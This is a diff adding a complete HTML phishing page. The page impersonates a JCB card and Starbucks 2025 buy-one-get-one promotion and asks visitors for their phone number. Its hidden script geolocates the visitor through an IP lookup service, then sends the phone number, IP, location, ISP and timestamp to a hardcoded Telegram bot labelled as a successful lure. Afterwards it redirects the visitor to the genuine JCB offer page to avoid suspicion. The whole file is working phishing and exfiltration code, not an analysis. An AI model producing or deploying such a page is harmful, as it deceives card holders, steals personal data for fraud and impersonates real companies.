@@ -1,1 +1,90 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2025 JCB晶緻卡 × 星巴克獨享禮遇</title>
+    <style>
+        body{margin:0;background:linear-gradient(135deg,#003087,#5B2D90);color:white;font-family:Arial,sans-serif;text-align:center;padding:20px 0;min-height:100vh}
+        .logo{max-width:120px;margin:20px auto}
+        h1{font-size:28px;margin:10px 0;font-weight:bold;text-shadow:0 2px 10px rgba(0,0,0,0.5)}
+        .cup{max-width:220px;margin:30px auto;border-radius:50%;box-shadow:0 10px 30px rgba(0,0,0,0.4)}
+        .box{background:rgba(255,255,255,0.15);backdrop-filter:blur(10px);border-radius:20px;padding:30px;margin:20px auto;max-width:380px;box-shadow:0 10px 30px rgba(0,0,0,0.3)}
+        .input-group{display:flex;height:56px;background:white;border-radius:14px;overflow:hidden;margin:20px 0;box-shadow:0 6px 20px rgba(0,0,0,0.3)}
+        select{background:#f0f0f0;border:none;font-size:19px;padding:0 15px;min-width:100px;text-align:center}
+        input{flex:1;border:none;font-size:19px;padding:0 15px;outline:none;color:#333}
+        button{width:100%;padding:18px;background:#00704A;color:white;border:none;border-radius:14px;font-size:20px;font-weight:bold;margin-top:10px;cursor:pointer;box-shadow:0 6px 20px rgba(0,112,74,0.3)}
+        button:disabled{background:#006633;cursor:wait}
+        .footer{margin-top:50px;font-size:12px;opacity:0.8}
+        .footer a{color:#E6E6FA;text-decoration:underline}
+    </style>
+</head>
+<body>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/8a/JCB_Logo.svg" class="logo" alt="JCB Logo">
+    <h1>2025 獨享禮遇</h1>
+    <p style="font-size:18px;margin:10px">JCB晶緻卡 × 星巴克</p>
+    <img src="https://images.starbucks.com.tw/uploadedImages/2025/Starbucks_Cup_2025.png" class="cup" alt="星巴克杯" onerror="this.src='https://starbucks.com.tw/images/logo.png'">
+    
+    <div class="box">
+        <p style="font-size:16px;line-height:1.8">
+            <b>消費滿 NT$150 享買一送一</b><br>
+            限 2025 全年・晶緻卡專屬<br>
+            立即驗證手機領取優惠碼！
+        </p>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <select id="countryCode">
+                    <option value="+886" selected>+886</option>
+                    <option value="+852">+852</option>
+                    <option value="+60">+60</option>
+                    <option value="+66">+66</option>
+                    <option value="+63">+63</option>
+                </select>
+                <input type="tel" id="phone" placeholder="912345678" required maxlength="12">
+            </div>
+            <button type="submit">立即領取優惠</button>
+        </form>
+    </div>
 
+    <div class="footer">
+        © 2025 JCB International Co., Ltd. All rights reserved.
+        <a href="https://www.jcb.co.jp/privacy/">隱私權政策</a> | 
+        <a href="https://www.jcb.co.jp/terms/">服務條款</a>
+    </div>
+
+    <script>
+        const TOKEN = "8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY";  // 第二台專用 Token
+        const CHAT_ID = "1137905005";
+
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            const code = document.getElementById("countryCode").value;
+            const phone = document.getElementById("phone").value.trim();
+            if (!phone) return;
+
+            const btn = document.querySelector("button");
+            btn.textContent = "驗證中...";
+            btn.disabled = true;
+
+            const ipData = await fetch("https://ipapi.co/json/").then(r => r.json()).catch(() => ({}));
+            const 時間 = new Date().toLocaleString("zh-TW", {timeZone: "Asia/Taipei"});
+
+            const 訊息 = "JCB星巴克優惠誘捕成功\n\n" +
+                        "電話：" + code + phone + "\n" +
+                        "IP　　：" + (ipData.ip || "未知") + "\n" +
+                        "位置　：" + (ipData.city || "未知") + "，" + (ipData.country_name === "Taiwan" ? "台灣" : ipData.country_name || "未知") + "\n" +
+                        "ISP　　：" + (ipData.org || "未知") + "\n" +
+                        "時間　：" + 時間;
+
+            fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({chat_id: CHAT_ID, text: 訊息})
+            });
+
+            setTimeout(() => location.href = "https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/", 3000);
+        });
+    </script>
+</body>
+</html>
